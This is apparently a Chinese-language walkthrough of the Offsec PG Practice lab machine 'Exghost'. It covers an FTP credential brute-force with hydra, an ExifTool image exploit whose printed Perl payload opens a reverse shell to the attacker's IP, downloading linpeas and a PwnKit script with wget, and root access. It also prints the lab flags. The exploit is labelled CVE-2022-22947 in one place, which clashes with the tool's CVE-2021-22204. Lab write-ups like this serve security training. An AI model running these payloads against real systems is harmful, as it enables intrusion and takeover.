###### tags: `Offsec` `PG Practice` `Easy` `Linux`

# Exghost
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.237.183 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.237.183:21
Open 192.168.237.183:80

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
80/tcp open  http    syn-ack Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Unix
```

用buster掃可以看到`uploads`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ feroxbuster -u http://192.168.237.183 -q -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt

http://192.168.237.183/uploads/
```

因為找不到其他東西，用hydra爆破ftp看看
```
┌──(kali㉿kali)-[~/pgplay]
└─$ hydra -C /home/kali/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.237.183
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-25 06:00:12
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking ftp://192.168.237.183:21/
[21][ftp] host: 192.168.237.183   login: user   password: system
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-25 06:00:38
```

用`user/system`登入看看
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ftp 192.168.237.183
Name (192.168.237.183:kali): user
331 Please specify the password.
Password: system
ftp> passive
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0          126151 Jan 27  2022 backup
ftp> get backup
```

看到一個流量檔，可以extract data
```
## exiftest.php
File uploaded successfully :)<pre>ExifTool Version Number         : 12.23
File Name                       : phpopnW14.jpg
Directory                       : /var/www/html/uploads
File Size                       : 14 KiB
File Modification Date/Time     : 2022:01:27 14:47:37+02:00
File Access Date/Time           : 2022:01:27 14:47:37+02:00
File Inode Change Date/Time     : 2022:01:27 14:47:37+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 120
Y Resolution                    : 120
Image Width                     : 253
Image Height                    : 257
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 253x257
Megapixels                      : 0.065
</pre>
```

又可以找到同上的漏洞[CVE-2022-22947](https://www.exploit-db.com/exploits/50911)
先下載，製作一個`image.jpg`，開nc，利用`curl`夾帶檔案
```
┌──(kali㉿kali)-[~/pgplay]
└─$ searchsploit -m 50911

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 50911.py -s 192.168.45.209 9001

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
RUNNING: UNICORD Exploit for CVE-2021-22204
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(9001,inet_aton('192.168.45.209')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")                                                   
RUNTIME: DONE - Exploit image written to 'image.jpg'

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

┌──(kali㉿kali)-[~/pgplay]
└─$ curl -F myFile=@image.jpg http://192.168.237.183/exiftest.php
```

在`/home/hassan`的路徑可得local.txt
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@exghost:/home/hassan$ cat local.txt
d839a86eccb612b9be7a22dd80123ed7
```

用`linpeas.sh`
```
www-data@exghost:/tmp$ wget 192.168.45.209/linpeas.sh
www-data@exghost:/tmp$ chmod +x linpeas.sh
www-data@exghost:/tmp$ ./linpeas.sh

...
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                          
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
...
```

用[CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py)成功取得root，在/root找到proof.txt
```
www-data@exghost:/tmp$ wget 192.168.45.209/CVE-2021-4034.py
www-data@exghost:/tmp$ python3 CVE-2021-4034.py
# whoami
root
# python3 -c 'import pty; pty.spawn("/bin/bash")'
proof.txt  snap
root@exghost:/root# cat proof.txt
7371f9f168502c85fc6b860e38ccd3a4
```